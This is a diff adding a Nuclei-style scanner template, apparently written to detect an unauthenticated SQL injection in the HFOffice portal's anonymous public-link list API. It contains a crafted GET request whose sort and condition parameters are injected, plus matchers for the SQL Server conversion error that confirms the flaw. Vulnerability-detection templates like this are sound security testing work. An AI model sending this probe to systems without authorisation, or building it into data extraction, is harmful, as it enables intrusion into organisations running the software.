@@ -1,0 +1,28 @@
+id: poc-yaml-hfoffice-anon-sqli
+info:
+  name: 红帆HFOffice Anonymous SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: hfoffice
+http:
+  - method: GET
+    path:
+      - "/api/portal-public-link/anon/list?sorts=[{\"Field\":\"SortID\",\"SortBy\":2},{\"Field\":'1',\"SortBy\":'1'}]&conditions=[{\"Field\":\"IsEnable\",\"DataType\":1,\"Option\":1,\"Value\":'user'},{\"Field\":\"Module\",\"DataType\":1,\"Option\":7,\"Value\":\"1\"}]"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 bit 时失败"
+      - type: regex
+        regex:
+          - "'([0-9a-zA-Z]+)'"
+      - type: word
+        words:
+          - "<"
+        negative: true
